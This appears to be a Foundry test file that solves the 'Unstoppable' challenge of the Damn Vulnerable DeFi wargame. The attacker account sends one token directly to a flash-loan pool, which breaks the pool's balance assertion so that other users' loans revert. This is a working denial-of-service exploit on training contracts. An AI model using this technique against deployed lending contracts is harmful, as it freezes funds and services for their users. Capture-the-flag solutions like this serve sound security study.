// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/0/UnstoppableLender.sol";
import "../src/0/ReceiverUnstoppable.sol";
import "../src/DamnValuableToken.sol";
contract UnstoppableTest is Test {
    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

    DamnValuableToken token;
    UnstoppableLender pool;
    ReceiverUnstoppable receiverContract;

    address attacker;
    address someUser;

    function setUp() external {
        attacker = vm.addr(1);
        someUser = vm.addr(2);
        // setup contracts
        token = new DamnValuableToken();
        pool = new UnstoppableLender(address(token));

        // setup tokens
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
    }
    
    function testComplete() external {
        vm.prank(attacker);
        token.transfer(address(pool), 1);
        vm.prank(someUser);
        vm.expectRevert(stdError.assertionError);
        pool.flashLoan(10);
    }
}